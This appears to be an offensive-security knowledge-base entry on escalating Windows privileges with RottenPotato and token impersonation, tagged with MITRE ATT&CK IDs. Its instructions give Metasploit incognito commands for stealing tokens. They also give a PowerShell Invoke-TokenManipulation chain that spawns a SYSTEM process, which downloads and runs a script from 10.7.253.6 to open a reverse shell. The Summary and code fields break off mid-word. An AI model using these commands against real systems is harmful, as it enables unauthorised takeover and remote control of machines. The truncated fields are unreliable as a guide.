---
id: a981e948-997b-4657-9a30-b3cf617a8ebe
name: Elevating Privileges via RottenPotato and Token Impersonation
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:30.141809+00:00'
updated_at: '2023-04-10T20:37:38.194983+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Access Token Manipulation|T1134 - Access Token Manipulation]]'
tags:
- '[[EoP - Impersonation Privileges]]'
- '[[RottenPotato (Token Impersonation)]]'
- '[[Windows - Privilege Escalation]]'
---

# Elevating Privileges via RottenPotato and Token Impersonation

## Summary

Elevating privileges via RottenPotato and Token Impersonation is a technique used to gain higher level access to a system by manipulating tokens. This technique is commonly used by attackers to escalate privileges and gain access to sensitive data. The technique works by exploiting the authenticati

## Description

# Description

Elevating privileges via RottenPotato and Token Impersonation is a technique used to gain higher level access to a system by manipulating tokens. This technique is commonly used by attackers to escalate privileges and gain access to sensitive data. The technique works by exploiting the authentication mechanism used by Windows to grant access to resources. Attackers can use RottenPotato to impersonate a higher privileged user and then manipulate the token to elevate their privileges. This technique is effective because it allows attackers to bypass traditional security measures and gain access to sensitive data.

## Requirements

1. Access to a vulnerable Windows system

1. Knowledge of RottenPotato and Token Impersonation techniques

## Defense

1. Implement the principle of least privilege to limit the number of users with high-level access

1. Monitor and log all privileged access to detect potential misuse

1. Regularly update and patch vulnerable systems to mitigate known vulnerabilities

## Objectives

1. Gain elevated privileges on a Windows system

1. Bypass traditional security measures to gain access to sensitive data

# Instructions

1. To use this exploit, first run `getuid` to check the current user's privileges. Then, run `getprivs` to see the available privileges. Next, load `incognito mode` by running `use incognito`. Use `list_tokens -u` to list available tokens, and `impersonate_token` to impersonate the desired token. Finally, navigate to the directory containing the executable file using `cd`, and execute the file using `execute -Hc -f`.

**Code**: [[getuid
getprivs
use incognito
list\_tokens -u
cd c]]

> This command exploits a vulnerability in a system using Metasploit with `incognito mode` loaded. The `getuid` command checks the current user's privileges, and `getprivs` lists available privileges. `use incognito` loads `incognito mode`, which allows the user to impersonate other users and tokens. `list_tokens -u` lists available tokens, and `impersonate_token` impersonates the desired token. `cd` navigates to the directory containing the executable file, and `execute -Hc -f` executes the file.

2. This command is used for privilege escalation by manipulating the access token of the current process. It impersonates a specific user or system account and creates a new process with elevated privileges. The command also downloads and executes a PowerShell script from a remote server.

**Code**: [[Invoke-TokenManipulation -ImpersonateUser -Usernam]]

> The command consists of three parts: 
1. Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser": This part impersonates a domain admin user, which grants the current process the privileges of the impersonated user.
2. Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM": This part impersonates the SYSTEM account, which grants the current process the highest level of privileges.
3. Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.7.253.6:82/Invoke-PowerShellTcp.ps1');\"};": This part creates a new process with elevated privileges using the wininit process. The new process executes a PowerShell script downloaded from a remote server using the Invoke-Expression cmdlet. The script establishes a reverse TCP connection with the attacker's server.

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Access Token Manipulation|T1134 - Access Token Manipulation]]

## Tags

- [[EoP - Impersonation Privileges]]
- [[RottenPotato (Token Impersonation)]]
- [[Windows - Privilege Escalation]]
